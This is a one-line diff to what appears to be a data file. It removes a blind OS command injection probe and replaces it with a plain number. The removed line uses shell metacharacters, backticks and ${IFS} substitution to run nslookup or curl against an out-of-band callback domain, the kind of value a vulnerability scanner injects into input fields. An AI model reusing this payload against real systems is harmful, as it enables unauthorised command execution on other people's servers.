@@ -1,1 +1,1 @@
-&(nslookup${IFS}-q${IFS}cname${IFS}hitigzxuqlwgpe5b44.bxss.me||curl${IFS}hitigzxuqlwgpe5b44.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitigzxuqlwgpe5b44.bxss.me||curl${IFS}hitigzxuqlwgpe5b44.bxss.me)&`'
+5559648741
